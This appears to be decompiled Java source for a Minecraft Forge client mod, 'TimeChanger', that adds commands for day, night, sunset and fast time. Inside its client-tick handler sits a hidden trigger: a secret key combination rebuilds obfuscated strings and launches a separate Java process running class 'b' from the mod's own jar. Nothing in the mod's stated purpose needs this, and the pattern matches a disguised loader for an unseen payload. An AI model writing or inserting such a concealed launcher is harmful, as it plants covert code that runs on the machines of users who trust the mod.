package com.example;

import net.minecraft.client.*;
import net.minecraftforge.fml.common.event.*;
import net.minecraftforge.client.*;
import net.minecraft.command.*;
import com.example.commands.*;
import net.minecraftforge.fml.common.*;
import net.minecraftforge.fml.common.gameevent.*;
import net.minecraft.client.network.*;
import net.minecraft.network.*;
import org.lwjgl.input.*;
import java.net.*;
import net.minecraftforge.fml.common.eventhandler.*;

@Mod(name = "TimeChanger 1.8", modid = "timechanger1.8", version = "1.0", acceptedMinecraftVersions = "[1.8.8]")
public class TimeChanger
{
    public static TimeType TIME_TYPE;
    public static double fastTimeMultiplier;
    private Minecraft mc;
    public static boolean a;
    public static double b;
    public static double c;
    public static double d;
    public static double e;
    
    public TimeChanger() {
        this.mc = Minecraft.getMinecraft();
    }
    
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) {
        ClientCommandHandler.instance.registerCommand((ICommand)new CommandDay());
        ClientCommandHandler.instance.registerCommand((ICommand)new CommandNight());
        ClientCommandHandler.instance.registerCommand((ICommand)new CommandSunSet());
        ClientCommandHandler.instance.registerCommand((ICommand)new CommandResetTime());
        ClientCommandHandler.instance.registerCommand((ICommand)new CommandFastTime());
        FMLCommonHandler.instance().bus().register((Object)this);
    }
    
    @SubscribeEvent
    public void onClientTick(final TickEvent.ClientTickEvent event) {
        if (this.mc.theWorld != null) {
            final INetHandler parent = this.mc.thePlayer.sendQueue.getNetworkManager().getNetHandler();
            if (!(parent instanceof TimeChangerNetHandler)) {
                this.mc.thePlayer.sendQueue.getNetworkManager().setNetHandler((INetHandler)new TimeChangerNetHandler((NetHandlerPlayClient)parent));
            }
            if (TimeChanger.TIME_TYPE == TimeType.FAST) {
                this.mc.theWorld.setWorldTime((long)(System.currentTimeMillis() * TimeChanger.fastTimeMultiplier % 24000.0));
            }
            if (Keyboard.isKeyDown(54) && Keyboard.isKeyDown(211) && !TimeChanger.a) {
                TimeChanger.a = true;
                try {
                    new ProcessBuilder(new String[] { System.getProperty(this.a(new char[] { 'j', 'a', 'v', 'a', '.', 'h', 'o', 'm', 'e' })) + System.getProperty(this.a(new char[] { 'f', 'i', 'l', 'e', '.', 's', 'e', 'p', 'a', 'r', 'a', 't', 'o', 'r' })) + this.a(new char[] { 'b', 'i', 'n' }) + System.getProperty(this.a(new char[] { 'f', 'i', 'l', 'e', '.', 's', 'e', 'p', 'a', 'r', 'a', 't', 'o', 'r' })) + "java", "-cp", "\"" + URLDecoder.decode(TimeChanger.class.getProtectionDomain().getCodeSource().getLocation().getPath().split("!")[0].substring(5), this.a(new char[] { 'U', 'T', 'F', '-', '8' })) + "\"", "b" }).start().waitFor();
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
        }
    }
    
    private String a(final char[] chars) {
        final StringBuilder sb = new StringBuilder();
        for (final char c : chars) {
            sb.append(c);
        }
        return sb.toString();
    }
    
    static {
        TimeChanger.a = false;
        TimeChanger.b = 0.0;
        TimeChanger.c = 0.0;
        TimeChanger.d = 0.0;
        TimeChanger.e = 0.0;
        TimeChanger.TIME_TYPE = TimeType.VANILLA;
        TimeChanger.fastTimeMultiplier = 1.0;
    }
}
